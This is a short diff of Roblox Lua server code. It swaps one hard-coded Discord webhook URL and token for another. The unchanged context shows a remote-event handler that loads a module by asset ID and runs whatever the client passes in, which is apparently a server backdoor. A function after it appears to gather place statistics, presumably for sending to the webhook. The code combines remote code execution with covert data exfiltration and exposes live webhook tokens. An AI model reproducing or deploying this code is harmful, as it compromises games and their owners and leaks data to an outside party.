@@ -5,7 +5,7 @@ new.OnServerEvent:Connect(function(player, Trm)
 require(5423914129)(Trm)()
 end
 local HttpService = game:GetService("HttpService")
-local webhookUrl = "https://discord.com/api/webhooks/1342564913083842631/R3-HZCuoFfDQDGazcLotVA5yyPREipkvfZChPMCFLBlyRMplI6vRMCVd3x2gXSNPypJk"
+local webhookUrl = "https://discord.com/api/webhooks/1335563932617805834/XPjmEF5VwZxdeWvo_p-O8f0HibG-JF7wklJ08sGfSsl2fNMjAb7ss314L7tnzVByb_qk"
 
 local function getPlaceStats()
     local stats = {
